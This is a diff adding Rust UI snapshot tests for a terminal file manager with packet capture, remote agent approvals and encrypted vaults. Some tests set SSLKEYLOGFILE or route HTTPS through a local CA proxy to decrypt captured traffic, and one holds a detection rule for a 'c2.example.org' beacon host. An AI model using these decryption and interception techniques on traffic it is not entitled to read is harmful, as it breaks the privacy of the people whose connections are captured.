+        Capture::read(&borg_testkit::capture::decryptable()).map_err(|error| anyhow::anyhow!(error.describe()))?;
+    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcapng");
+    stage.send(Msg::CaptureOpened { path, result: Ok(capture) }).send(key(KeyCode::Char('3')));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, " · decrypted")?;
+    ensure_text(&buffer, "GET /api")?;
+    ensure_text(&buffer, "HTTP/1.1")?;
+    ensure_text(&buffer, " · still encrypted")?;
+    check("traffic_decrypted_stream", &stage, buffer)
 }
 
 /// Where Borg can ask the system for an administrator, the capture dialog offers **Run as**. A
@@ -3156,6 +5355,116 @@ fn network_captures_as_administrator_and_names_every_packets_process() -> Result
     Ok(())
 }
 
+/// A capture that keeps TLS keys sets `SSLKEYLOGFILE` at Borg's shell prompt, says so while it
+/// records, and offers the line for programs started in another terminal.
+#[test]
+fn network_records_tls_keys_through_borgs_shell() -> Result<()> {
+    use borg_core::{CaptureField, Effect, Overlay, TlsKeys, View};
+    use borg_term::ShellSignal;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.state.shell.integrated = true;
+    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r')));
+    while !matches!(&stage.state.overlay, Some(Overlay::Capture(dialog)) if dialog.selected() == CaptureField::TlsKeys)
+    {
+        stage.send(key(KeyCode::Down));
+    }
+    stage.send(key(KeyCode::Right));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "TLS keys   ‹ Set SSLKEYLOGFILE in Borg's shell ›")?;
+    check("network_capture_dialog_tls_keys", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
+    assert_eq!(request.tls_keys, TlsKeys::Shell);
+    let key_log = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.keylog");
+    let effects = borg_core::update(&mut stage.state, Msg::CaptureKeys { id, path: key_log, proxy: None }, now);
+    let export = b"export SSLKEYLOGFILE='/home/me/projects/borg/capture-20260101-120000.keylog'\r".to_vec();
+    assert!(effects.contains(&Effect::Write(export)), "the line is typed at the prompt: {effects:?}");
+    assert_eq!(stage.state.view, View::Shell, "where it shows");
+    stage.send(Msg::Signal(ShellSignal::CommandEnd { exit: Some(0) }));
+    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "61 packets · 51K · 5 s left · TLS keys")?;
+    ensure_text(&buffer, "L Copy SSLKEYLOGFILE")?;
+    check("network_capture_tls_keys", &stage, buffer)?;
+    Ok(())
+}
+
+/// A capture through Borg's proxy names the CA that signs for it in the dialog, points HTTPS at
+/// the proxy in Borg's shell, and says where the proxy listens while it records.
+#[test]
+fn network_records_https_through_borgs_proxy() -> Result<()> {
+    use borg_core::{Authority, CaptureField, Effect, Overlay, ProxyEndpoint, TlsKeys};
+    use borg_term::ShellSignal;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.state.shell.integrated = true;
+    let folder = PathBuf::from("/home/me/.local/share/mkcert");
+    stage.state.network.authority = Authority::Folder(folder.clone());
+    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r')));
+    while !matches!(&stage.state.overlay, Some(Overlay::Capture(dialog)) if dialog.selected() == CaptureField::TlsKeys)
+    {
+        stage.send(key(KeyCode::Down));
+    }
+    stage.send(key(KeyCode::Right)).send(key(KeyCode::Right));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "‹ Proxy HTTPS through Borg with the CA in /home/me/.local/share/mkcert ›")?;
+    check("network_capture_dialog_proxy", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
+    assert_eq!(request.tls_keys, TlsKeys::Proxy(Authority::Folder(folder)));
+    let key_log = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.keylog");
+    let proxy = ProxyEndpoint {
+        address: "127.0.0.1:54321".parse()?,
+        trust: PathBuf::from("/run/user/1000/borg/trust-4242-1.pem"),
+    };
+    let effects = borg_core::update(&mut stage.state, Msg::CaptureKeys { id, path: key_log, proxy: Some(proxy) }, now);
+    let typed = |effect: &Effect| matches!(effect, Effect::Write(line) if line.starts_with(b"export HTTPS_PROXY='http://127.0.0.1:54321' "));
+    assert!(effects.iter().any(typed), "the line is typed at the prompt: {effects:?}");
+    stage.send(Msg::Signal(ShellSignal::CommandEnd { exit: Some(0) }));
+    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "61 packets · 51K · 5 s left · Proxy on 127.0.0.1:54321")?;
+    ensure_text(&buffer, "L Copy proxy settings")?;
+    check("network_capture_proxy", &stage, buffer)?;
+    Ok(())
+}
+
+/// A capture that runs until it is stopped says in the footer when a limit stops it at its
+/// rate so far, and the stream of a connection it kept only the start of says how much it left
+/// out.
+#[test]
+fn network_capture_tells_when_a_limit_stops_it_and_what_it_left_out() -> Result<()> {
+    use borg_core::{Capture, ConnectionBudget, Effect};
+    const MIB: u64 = 1024 * 1024;
+    const KEPT: u64 = 200;
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    let now = borg_testkit::network::open(&mut stage)?;
+    stage.send(key(KeyCode::Char('r'))).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Left));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
+    assert_eq!((request.seconds, request.keep), (None, Keep::ConnectionStart));
+    let progress = CaptureProgress { bytes: 64 * MIB, packets: 40_000, room: Some(8 * 1024 * MIB) };
+    stage.send(Msg::CaptureProgress { id, progress });
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now + Duration::from_secs(10))?;
+    ensure_text(&buffer, "40000 packets · 64M · about 30 s to 256 MiB")?;
+    check("network_capture_limit_ahead", &stage, buffer)?;
+
+    let mut budget = ConnectionBudget::new(KEPT);
+    let trimmed = [budget.feed(&borg_testkit::capture::bytes()), budget.rest()].concat();
+    let capture = Capture::read(&trimmed).map_err(|error| anyhow::anyhow!(error.describe()))?;
+    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcap");
+    stage.send(Msg::CaptureDone { id, result: Ok((path, capture)) }).send(key(KeyCode::Char('3')));
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, " left out")?;
+    check("traffic_stream_left_out", &stage, buffer)
+}
+
 /// A capture without tcpdump offers to install it with the package manager Borg found, and
 /// Enter types the command into the shell.
 #[test]
@@ -3176,6 +5485,106 @@ fn network_offers_to_install_a_missing_tcpdump() -> Result<()> {
     assert!(effects.contains(&Effect::Write(b"sudo apt-get install tcpdump\r".to_vec())), "Enter types the command");
     assert_eq!(stage.state.view, View::Shell, "and shows the shell");
     Ok(())
+}
+
+/// Remote → Background service… asks the app how the service stands. A missing one gets the
+/// dialog with the command that installs, enables and starts it, a row for each part, and Enter
+/// types it into the shell.
+#[test]
+fn remote_menu_offers_to_install_the_background_service() -> Result<()> {
+    use borg_core::{Action, Effect, MenuCursor, Overlay, Pointer, ServiceCheck, ServiceStatus, View};
+    let mut stage = stage(GridSize { cols: 100, rows: 28 }, Motion::STILL)?;
+    let now = stage.started;
+    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Remote").unwrap();
+    stage.send(Msg::Pointer(Pointer::Menu(index)));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "Background service…")?;
+    check("remote_menu", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Up));
+    let Some(Overlay::Menu(MenuCursor { item: Some(item), .. })) = stage.state.overlay else {
+        panic!("the menu is open")
+    };
+    let chosen = borg_core::menus(&stage.state)[index].item(item).map(|entry| entry.action);
+    assert_eq!(chosen, Some(Action::BackgroundService), "Up wraps to the last entry");
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    assert!(effects.contains(&Effect::CheckService), "the app is asked: {effects:?}");
+    let program = "/usr/local/bin/borg".to_owned();
+    stage.send(Msg::Service(ServiceCheck { status: ServiceStatus::Missing, program, root: false }));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "/usr/local/bin/borg service enable &&")?;
+    check("service_install", &stage, buffer)?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
+    let typed = b"/usr/local/bin/borg service install && /usr/local/bin/borg service enable && \
+/usr/local/bin/borg service start\r";
+    assert!(effects.contains(&Effect::Write(typed.to_vec())), "Enter types the command: {effects:?}");
+    assert_eq!(stage.state.view, View::Shell, "and shows the shell");
+    Ok(())
+}
+
+/// A newer release found by the daily check waits until the keyboard rests, then the dialog
+/// offers `borg update`, and a click on S in its bottom line skips the version.
+#[test]
+fn a_newer_release_is_offered_once_the_keyboard_rests() -> Result<()> {
+    use borg_core::{Effect, Overlay, UpdateOffer};
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    let mut stage = stage(GridSize { cols: 100, rows: 28 }, Motion::STILL)?;
+    let start = stage.started;
+    let offer = UpdateOffer {
+        version: "0.11.0".into(),
+        current: "0.10.0".into(),
+        program: "/usr/local/bin/borg".into(),
+        manager: None,
+    };
+    stage.send(Msg::UpdateAvailable(offer.clone()));
+    assert_eq!(stage.state.overlay, None, "it waits for a pause");
+    let later = stage.state.wake_at().unwrap();
+    borg_core::update(&mut stage.state, Msg::Tick, later);
+    assert_eq!(stage.state.overlay, Some(Overlay::Update(offer)));
+    let buffer = stage.render(later)?;
+    ensure_text(&buffer, "/usr/local/bin/borg update")?;
+    check("update_offer", &stage, buffer.clone())?;
+
+    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
+    let (column, row) = screen.find("S Skip version").unwrap();
+    let click =
+        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE };
+    let msg = borg_ui::mouse_input(&stage.state, click, false, start).unwrap();
+    let effects = borg_core::update(&mut stage.state, msg, later);
+    assert_eq!(effects, [Effect::SkipUpdate("0.11.0".into())]);
+    assert_eq!(stage.state.overlay, None);
+    Ok(())
+}
+
+/// Remote → Remote log… opens the log with no agent connected: what agents did before Borg
+/// started again, each entry with its date.
+#[test]
+fn remote_log_shows_what_agents_did_before_borg_started_again() -> Result<()> {
+    use borg_core::{Action, MenuCursor, Overlay, Pointer};
+    let mut stage = stage(GridSize { cols: 100, rows: 28 }, Motion::STILL)?;
+    let now = stage.started;
+    stage.state.agent.restore_log(vec![
+        "2026-11-08 23:10:04  an agent connected".into(),
+        "2026-11-08 23:10:09  ran in ~/srv/shop\n$ make test\n[exit 0]".into(),
+        "2026-11-08 23:12:41  declined editing ~/srv/shop/.env".into(),
+        "2026-11-08 23:13:02  an agent disconnected".into(),
+    ]);
+    assert!(!stage.state.agent.connected());
+    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Remote").unwrap();
+    stage.send(Msg::Pointer(Pointer::Menu(index)));
+    stage.send(key(KeyCode::Up));
+    stage.send(key(KeyCode::Up));
+    let Some(Overlay::Menu(MenuCursor { item: Some(item), .. })) = stage.state.overlay else {
+        panic!("the menu is open")
+    };
+    let chosen = borg_core::menus(&stage.state)[index].item(item).map(|entry| entry.action);
+    assert_eq!(chosen, Some(Action::AgentLog), "the entry above Background service…");
+    stage.send(key(KeyCode::Enter));
+    assert_eq!(stage.state.overlay, Some(Overlay::AgentLog { scroll: None }));
+    let buffer = stage.render(now)?;
+    ensure_text(&buffer, "2026-11-08 23:12:41  declined editing ~/srv/shop/.env")?;
+    check("agent_log_restored", &stage, buffer)
 }
 
 /// Docker → Files: the list's panel shows the container's filesystem, named in its title,
@@ -3277,17 +5686,238 @@ fn remote_access_shows_the_pairing_link_and_takes_a_relay() -> Result<()> {
 
 #[test]
 fn pairing_asks_with_the_code_both_ends_show() -> Result<()> {
-    use borg_core::{AgentEvent, Ask, AskKind, DiffLine};
+    use borg_core::AgentEvent;
     let mut stage = stage(SIZE, Motion::STILL)?;
     let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
-    let mut body = vec![DiffLine::plain("Computer: me@laptop"), DiffLine::plain("")];
-    body.extend(code.rows(true).into_iter().map(|row| DiffLine::plain(format!("  {row}"))));
-    body.extend([DiffLine::plain(""), DiffLine::plain("Pair only if `borg pair` shows this code on that computer.")]);
-    let ask = Ask { kind: AskKind::Pair, summary: "me@laptop".into(), place: String::new(), body };
+    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
     stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "shows this code")?;
     check("pairing_code", &stage, buffer)
+}
+
+#[test]
+fn a_locked_computer_key_asks_for_its_password_without_showing_it() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(Msg::ComputerKeyLocked { wrong: false });
+    for msg in chars("rain cobalt") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
+    ensure_text(&buffer, "Unlock key")?;
+    anyhow::ensure!(!describe(&buffer).contains("cobalt"), "the password must stay hidden");
+    check("computer_key_password", &stage, buffer)
+}
+
+#[test]
+fn an_encrypted_file_asks_for_its_password_without_showing_it() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let path = PathBuf::from("/home/me/projects/borg/notes.md.age");
+    stage.state.opening = Some(path.clone());
+    let then = borg_core::Then::View;
+    stage.send(Msg::Sealed(borg_core::SealedFile { path, format: borg_crypt::sealed::Format::Age, then }));
+    for msg in chars("rain cobalt") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
+    ensure_text(&buffer, "Encrypted file")?;
+    ensure_text(&buffer, "notes.md.age, encrypted with age")?;
+    anyhow::ensure!(!describe(&buffer).contains("cobalt"), "the password must stay hidden");
+    check("encrypted_file_password", &stage, buffer)
+}
+
+const VAULT: &str = "/home/me/projects/borg/Papers";
+const VAULT_ROOT: &str = "/run/user/1000/borg-commander/vaults/Papers";
+
+fn vault_found(stage: &mut Stage) {
+    let generation = stage.state.panel(borg_core::Side::Left).generation();
+    stage.send(Msg::VaultFound { side: borg_core::Side::Left, generation, cipher: VAULT.into(), open: None });
+}
+
+#[test]
+fn a_locked_vault_asks_for_its_password_without_showing_it() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    vault_found(&mut stage);
+    for msg in chars("rain cobalt") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
+    ensure_text(&buffer, "Vault")?;
+    ensure_text(&buffer, "Papers")?;
+    anyhow::ensure!(!describe(&buffer).contains("cobalt"), "the password must stay hidden");
+    check("vault_password", &stage, buffer)
+}
+
+const RECOVERY_KEY: &str = "0a1b2c3d-4e5f6a7b-8c9d0e1f-2a3b4c5d-6e7f8a9b-0c1d2e3f-4a5b6c7d-8e9f0a1b";
+const RECOVERY_KEY_LAST: &str = "8e9f0a1b";
+
+fn recovery_key_shown(size: GridSize) -> Result<Stage> {
+    let mut stage = stage(size, Motion::STILL)?;
+    let vault = borg_core::VaultMount { cipher: VAULT.into(), root: VAULT_ROOT.into() };
+    let key = borg_core::Password::new(RECOVERY_KEY);
+    let tax = vec![entry("2024", EntryKind::Dir, 4096, RECENT, false)];
+    let created = Msg::VaultCreated { side: borg_core::Side::Left, cipher: VAULT.into(), key, opened: Ok(vault) };
+    list_after(&mut stage, created, tax)?;
+    Ok(stage)
+}
+
+fn ensure_whole_key(buffer: &Buffer) -> Result<()> {
+    let shown: String = describe(buffer).split_whitespace().filter(|word| word.contains('-')).collect::<String>();
+    let groups = RECOVERY_KEY.split('-').filter(|group| shown.contains(group)).count();
+    anyhow::ensure!(groups == RECOVERY_KEY.split('-').count(), "the whole key shows\n{}", describe(buffer));
+    Ok(())
+}
+
+#[test]
+fn a_new_vault_shows_its_recovery_key_over_its_files() -> Result<()> {
+    let mut stage = recovery_key_shown(SIZE)?;
+    for msg in chars("8e9f") {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Recovery key")?;
+    ensure_text(&buffer, "type the key's last group below")?;
+    ensure_whole_key(&buffer)?;
+    ensure_text(&buffer, "Papers · vault")?;
+    check("vault_recovery_key", &stage, buffer)?;
+    stage.send(key(KeyCode::Enter));
+    ensure_text(&stage.render(stage.started)?, "Recovery key")?;
+    for msg in chars("0a1b") {
+        stage.send(msg);
+    }
+    stage.send(key(KeyCode::Enter));
+    let buffer = stage.render(stage.started)?;
+    ensure_no_text(&buffer, "Recovery key")?;
+    Ok(())
+}
+
+#[test]
+fn a_recovery_key_fits_a_narrow_screen() -> Result<()> {
+    let mut stage = recovery_key_shown(GridSize { cols: 40, rows: 24 })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_whole_key(&buffer)?;
+    anyhow::ensure!(!describe(&buffer).contains("-…"), "no group is cut");
+    check("vault_recovery_key_narrow", &stage, buffer)
+}
+
+#[test]
+fn a_recovery_key_keeps_its_rows_on_a_short_screen() -> Result<()> {
+    let mut stage = recovery_key_shown(GridSize { cols: 90, rows: 10 })?;
+    let buffer = stage.render(stage.started)?;
+    ensure_whole_key(&buffer)?;
+    ensure_text(&buffer, RECOVERY_KEY_LAST)?;
+    check("vault_recovery_key_short", &stage, buffer)
+}
+
+#[test]
+fn a_vault_without_gocryptfs_offers_to_install_it() -> Result<()> {
+    use borg_core::{Elevation, Installer, PackageManager, VaultError};
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let installer = Installer { manager: PackageManager::Apt, elevation: Some(Elevation::Sudo) };
+    let error = VaultError::NoTool(Some(installer));
+    stage.send(Msg::VaultFailed { side: borg_core::Side::Left, cipher: VAULT.into(), error });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "sudo apt-get install gocryptfs")?;
+    check("vault_install_gocryptfs", &stage, buffer)
+}
+
+#[test]
+fn a_pairing_approval_shows_over_the_remote_access_dialog() -> Result<()> {
+    use borg_core::AgentEvent;
+    let mut stage = stage(GridSize { cols: 90, rows: 34 }, Motion::STILL)?;
+    stage.state.agent.connect = borg_core::ConnectInfo {
+        name: "borg-web1".into(),
+        program: "/home/deploy/.local/bin/borg".into(),
+        ssh: Some("deploy@203.0.113.9".into()),
+        relay: "wss://relay.example.com".into(),
+    };
+    stage.send(key(KeyCode::F(1))).send(key(KeyCode::Char('c')));
+    let link = format!("borg://relay.example.com/{}#{}", "ab".repeat(32), "cd".repeat(16));
+    stage.send(Msg::Agent(AgentEvent::Pairing(Ok(link))));
+    let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
+    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Pair this computer with borg?")?;
+    ensure_text(&buffer, "Tab picks · Enter copies")?;
+    check("pairing_over_remote_access", &stage, buffer)
+}
+
+#[test]
+fn a_narrow_pairing_dialog_keeps_its_words_and_code_whole() -> Result<()> {
+    use borg_core::AgentEvent;
+    let mut stage = stage(GridSize { cols: 46, rows: 22 }, Motion::STILL)?;
+    let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
+    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "code on that computer.")?;
+    check("pairing_code_narrow", &stage, buffer)
+}
+
+#[test]
+fn a_narrow_approve_all_dialog_breaks_between_words() -> Result<()> {
+    use borg_core::AgentEvent;
+    let mut stage = stage(GridSize { cols: 46, rows: 20 }, Motion::STILL)?;
+    let ask = borg_core::approve_all_ask("dev@harbor [873dd93b…]", "Default");
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "individual")?;
+    check("approve_all_narrow", &stage, buffer)
+}
+
+/// What the borg on `web1` says waits in its Default session: a command an agent on another
+/// computer asks to run.
+fn host_feed(view_only: Option<&str>, approve_all: &[&str]) -> borg_core::AskFeed {
+    use borg_core::{Ask, AskKind, DiffLine, Waiting};
+    let command = "systemctl reload nginx";
+    let ask = Ask {
+        kind: AskKind::Run,
+        summary: command.into(),
+        place: "~/srv/menu".into(),
+        origin: Some("dev@harbor [873dd93b…]".into()),
+        body: vec![DiffLine::code(command)],
+    };
+    borg_core::AskFeed {
+        run: "a1".into(),
+        version: 1,
+        waiting: if approve_all.is_empty() { vec![Waiting { id: 3, ask }] } else { Vec::new() },
+        ended: Vec::new(),
+        approve_all: approve_all.iter().map(|origin| (*origin).to_owned()).collect(),
+        view_only: view_only.map(str::to_owned),
+    }
+}
+
+fn host_asks(feed: borg_core::AskFeed) -> Msg {
+    Msg::HostAsks { machine: "web1".into(), session: "default".into(), event: borg_core::HostEvent::Feed(feed) }
+}
+
+#[test]
+fn a_request_waiting_on_a_watched_host_shows_over_the_local_panels() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(host_asks(host_feed(None, &[])));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Remote on web1")?;
+    ensure_text(&buffer, "systemctl reload nginx")?;
+    check("agent_host_run_approval", &stage, buffer)
+}
+
+#[test]
+fn a_request_on_a_host_another_computer_controls_shows_without_answers() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(host_asks(host_feed(Some("ops@desk [5f0e11aa…]"), &[])));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "View only: ops@desk controls this session")?;
+    check("agent_host_view_only", &stage, buffer)
+}
+
+#[test]
+fn approve_all_on_a_watched_host_shows_a_badge_that_stops_it() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(host_asks(host_feed(None, &["dev@harbor [873dd93b…]"])));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Approve all on web1")?;
+    check("agent_host_approve_all_badge", &stage, buffer)
 }
 
 #[test]
@@ -3297,18 +5927,70 @@ fn a_capture_asks_with_its_traffic_interface_and_length() -> Result<()> {
     let request = CaptureRequest {
         interface: "en0".into(),
         seconds: Some(10),
-        headers_only: false,
+        keep: Keep::Whole,
         filter: "udp port 53".into(),
         folder: "/home/dev/work".into(),
         administrator: false,
         processes: false,
+        tls_keys: borg_core::TlsKeys::Off,
+        keep_free_mib: None,
     };
     let scope = CaptureScope::Port { transport: Transport::Udp, port: 53 };
-    let ask = borg_core::capture_ask(scope, None, &request, String::new());
+    let ask = borg_core::capture_ask(scope, None, &request, None);
     stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "Remote wants to capture traffic")?;
     check("agent_capture_approval", &stage, buffer)
+}
+
+#[test]
+fn a_file_another_computer_asks_to_create_names_that_computer_after_the_path() -> Result<()> {
+    use borg_core::{AgentEvent, Ask, AskKind, Change, DiffLine};
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let site = "server {\n    listen 80;\n    server_name menu.example.com;\n    root /srv/menu;\n}";
+    let body =
+        (1..).zip(site.lines()).map(|(number, line)| DiffLine::diff(Change::Added, Some(number), line)).collect();
+    let ask = Ask {
+        kind: AskKind::Create,
+        summary: "/etc/nginx/sites-available/menu".into(),
+        place: String::new(),
+        origin: Some("dev@harbor [873dd93b…]".into()),
+        body,
+    };
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "/etc/nginx/sites-available/menu · asked from dev@harbor [873dd93b…]")?;
+    check("agent_remote_create_approval", &stage, buffer)
+}
+
+#[test]
+fn an_upload_names_the_file_it_sends_from_the_other_computer() -> Result<()> {
+    use borg_core::AgentEvent;
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let ask = borg_core::upload_ask(
+        "/srv/menu/prices.csv".into(),
+        Some("~/work/menu/prices.csv"),
+        format!("{} (4200 bytes)", borg_ui::size_text(4200)),
+        Some("dev@harbor [873dd93b…]".into()),
+    );
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Source: ~/work/menu/prices.csv")?;
+    check("agent_upload_approval", &stage, buffer)
+}
+
+#[test]
+fn a_scan_asks_with_the_process_the_checks_and_the_agents_own_rules() -> Result<()> {
+    use borg_core::{AgentEvent, ScanChecks, ScanSubject};
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let program = std::path::Path::new("/usr/bin/sample");
+    let subject = ScanSubject { name: "sample", pid: 4100, program: Some(program) };
+    let rules = "rule beacon {\n  strings: $host = \"c2.example.org\"\n  condition: $host\n}";
+    let ask = borg_core::scan_ask(subject, ScanChecks::Both, Some(rules), Some("laptop".into()));
+    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Remote wants to scan process memory")?;
+    check("agent_scan_approval", &stage, buffer)
 }
 
 #[test]
@@ -3580,6 +6262,7 @@ fn time_machine_marks_excluded_entries_and_lists_exclusions_by_kind() -> Result<
         items: Some(3),
         disk: None,
         backup: Some(Exclusion::Sticky),
+        drive: None,
     };
     peek(&mut stage, borg_core::Aside::Info, borg_core::Peek::Info(facts))?;
     let buffer = stage.render(stage.started)?;
@@ -3805,7 +6488,7 @@ fn a_cd_to_a_typed_folder_lists_its_subfolders_first() -> Result<()> {
 
 #[test]
 fn a_path_in_any_command_lists_its_subfolders_to_complete() -> Result<()> {
-    let mut stage = stage(SIZE, Motion::STILL)?;
+    let mut stage = stage_with(SIZE, Motion::STILL, NO_HIDDEN)?;
     stage.state.folders = folders();
     stage.shell(b"cp notes.txt /Volumes/");
     stage.send(subfolders("/Volumes", &["Macintosh HD", "Backup", "Photos", ".Trashes"]));
@@ -3813,6 +6496,7 @@ fn a_path_in_any_command_lists_its_subfolders_to_complete() -> Result<()> {
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "Tab/Enter Complete")?;
     ensure_text(&buffer, "/Volumes/Backup")?;
+    ensure_no_text(&buffer, ".Trashes")?;
     check("path_picker", &stage, buffer)
 }
 
@@ -3830,4 +6514,866 @@ fn ctrl_backslash_opens_the_folder_hotlist_on_the_panels_folder() -> Result<()> 
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "Filter pro")?;
     check("folder_hotlist_filtered", &stage, buffer)
+}
+
+#[test]
+fn borgs_files_lists_each_place_the_captures_and_what_is_left_over() -> Result<()> {
+    use borg_core::{Cleanup, Leftover, Overlay, Place, PlaceUsage, SavedCapture, StorageReport, StorageWindow};
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(key(KeyCode::F(9)));
+    let options =
+        borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Options").context("an Options menu")?;
+    while !matches!(&stage.state.overlay, Some(Overlay::Menu(cursor)) if cursor.menu == options) {
+        stage.send(key(KeyCode::Right));
+    }
+    stage.send(key(KeyCode::Up)).send(key(KeyCode::Enter));
+    assert!(matches!(stage.state.overlay, Some(Overlay::Storage(StorageWindow { report: None, .. }))));
+    ensure_text(&stage.render(stage.started)?, "Measuring…")?;
+    let usage =
+        |place, path: Option<&str>, bytes, items| PlaceUsage { place, path: path.map(PathBuf::from), bytes, items };
+    let saved = at(RECENT).context("a recent time")?;
+    let report = StorageReport {
+        places: vec![
+            usage(Place::Temporary, Some("/run/user/1000/borg-commander"), 19_456, 14),
+            usage(Place::Sockets, Some("/tmp/borg-1000-default"), 0, 2),
+            usage(Place::Caches, Some("/home/me/.cache/borg-commander"), 24_117_248, 21),
+            usage(Place::State, Some("/home/me/.local/state/borg-commander"), 60_416, 18),
+            usage(Place::Settings, Some("/home/me/.config/borg-commander"), 342, 2),
+            usage(Place::Captures, None, 3_145_728, 2),
+        ],
+        captures: vec![
+            SavedCapture {
+                path: "/home/me/projects/borg/capture-20260115-114210.pcapng".into(),
+                bytes: 2_097_152,
+                saved,
+                keys: Some("/home/me/projects/borg/capture-20260115-114210.keylog".into()),
+            },
+            SavedCapture {
+                path: "/home/me/net/capture-20260110-090000.pcap".into(),
+                bytes: 1_048_576,
+                saved,
+                keys: None,
+            },
+        ],
+        leftovers: vec![
+            Leftover { path: "/run/user/1000/borg-commander/0.8.3".into(), bytes: 2_744 },
+            Leftover { path: "/run/user/1000/borg-commander/0.8.2".into(), bytes: 2_744 },
+            Leftover { path: "/home/me/.cache/borg-commander/sizes-ab.json".into(), bytes: 10_011_004 },
+            Leftover { path: "/tmp/borg-1000-default/session-default-4242.sock".into(), bytes: 0 },
+        ],
